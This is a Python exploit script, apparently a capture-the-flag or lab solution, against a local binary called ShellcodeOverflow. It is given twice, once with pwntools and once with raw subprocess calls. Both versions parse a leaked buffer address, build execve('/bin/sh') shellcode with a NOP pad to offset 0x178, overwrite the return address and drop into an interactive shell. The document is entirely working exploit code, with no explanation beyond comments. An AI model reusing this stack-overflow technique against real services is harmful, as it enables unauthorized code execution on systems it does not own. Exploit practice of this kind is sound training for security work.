#--- WITH PWNTOOLS ---

from pwn import *

context.binary = './ShellcodeOverflow'
context.arch = 'amd64'

# Start the process
p = process('./ShellcodeOverflow')

# Read the line that contains the buffer address
line = p.recvline().decode()
print(f"[debug] line = {line.strip()}")

# Parse the address
buf_addr = int(line.strip().split()[-1], 16)
print(f"[+] Parsed buf address: {hex(buf_addr)}")

# Wait for the "Now reading in" line
p.recvuntil(b'>>>')

# Build payload: shellcode + padding + return address overwrite
shellcode = asm(shellcraft.sh())  # execve /bin/sh
payload = shellcode.ljust(0x178, b'\x90')  # NOP sled to align
payload += p64(buf_addr)  # Overwrite return address

# Send the payload
p.sendline(payload)

# Get shell
p.interactive()

'''

import subprocess
import re
import struct
import time
import os

# (x86_64 execve("/bin/sh"))
shellcode = (
    b"\x48\x31\xf6"                      # xor    rsi, rsi
    b"\x56"                              # push   rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # movabs rdi, '/bin/sh\x00'
    b"\x57"                              # push   rdi
    b"\x48\x89\xe7"                      # mov    rdi, rsp
    b"\x48\x31\xd2"                      # xor    rdx, rdx
    b"\x48\x31\xc0"                      # xor    rax, rax
    b"\xb0\x3b"                          # mov    al, 59
    b"\x0f\x05"                          # syscall
)

proc = subprocess.Popen(
    ['./ShellcodeOverflow'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

# Get Buf Addr
while True:
    line = proc.stdout.readline().decode()
    print("[Prog] " + line.strip())

    if 'buf is at: ' in line:
        buf_addr = line.split(':')[1].strip()
        break

#Finish getting output
while True:
    line = proc.stdout.readline().decode()
    print("[Prog] " + line.strip())
    if ">>>" in line:
        break

# Build payload
buf_addr = int(buf_addr.split('0x')[1],16)
print(f'[Expl]: buff address @ {hex(buf_addr)}')
offset = 0x178
payload  = shellcode.ljust(offset, b'\x90')
payload += struct.pack("<Q", buf_addr)

proc.stdin.write(payload + b'\n')
proc.stdin.flush()
proc.stdin.write(b'echo 1337\n')
print(proc.stdout.readline())

# Give shell interaction -- Thanks ChatGPT
print("[*] Dropping to manual interaction (Ctrl+C to exit)")
try:
    while True:
        out = proc.stdout.readline()
        if out:
            print(out.decode(), end="")
        else:
            break
except KeyboardInterrupt:
    proc.terminate()
'''